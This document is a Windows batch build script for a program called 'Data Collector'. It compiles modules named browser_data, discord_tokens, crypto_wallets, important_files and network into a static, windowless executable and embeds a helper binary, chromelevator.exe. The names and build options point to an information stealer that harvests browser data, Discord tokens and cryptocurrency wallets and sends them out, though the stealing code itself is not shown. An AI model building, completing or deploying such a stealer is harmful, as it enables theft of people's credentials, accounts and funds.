@echo off
echo Building Data Collector...

REM Create/clean build directory
if exist build rmdir /s /q build
mkdir build
cd build

echo Using MinGW g++...

REM Set MinGW path
set PATH=C:\mningwww\x86_64-15.1.0-release-win32-seh-ucrt-rt_v12-rev0\mingw64\bin;%PATH%

REM Compile the resource file (embeds chromelevator.exe)
echo Compiling resources...
windres ..\src\resources.rc -o resources.o
if %errorlevel% neq 0 (
    echo Resource compilation failed!
    cd ..
    exit /b 1
)

REM Compile with MinGW
echo Compiling source files...
g++ -std=c++17 -static -static-libgcc -static-libstdc++ -O2 -DNOMINMAX -DWIN32_LEAN_AND_MEAN -D_CRT_SECURE_NO_WARNINGS ^
    -I..\include ^
    ..\src\main.cpp ^
    ..\src\utils.cpp ^
    ..\src\network.cpp ^
    ..\src\system_info.cpp ^
    ..\src\browser_data.cpp ^
    ..\src\discord_tokens.cpp ^
    ..\src\crypto_wallets.cpp ^
    ..\src\important_files.cpp ^
    resources.o ^
    -o data_collector.exe ^
    -lwinhttp -lurlmon -lshell32 -lole32 -loleaut32 ^
    -lwbemuuid -ladvapi32 -luser32 -lgdi32 -lpsapi -lshlwapi ^
    -liphlpapi -lws2_32 -lcrypt32 -lnetapi32 -mwindows

if %errorlevel% equ 0 goto :success

echo Build failed!
cd ..
exit /b 1

:success
echo Build completed successfully!
if exist data_collector.exe (
    copy data_collector.exe ..\
    cd ..
    echo Executable created: data_collector.exe
    echo chromelevator.exe is now embedded - no external files needed!
) else (
    echo Error: Executable not found after build!
    cd ..
    exit /b 1
)
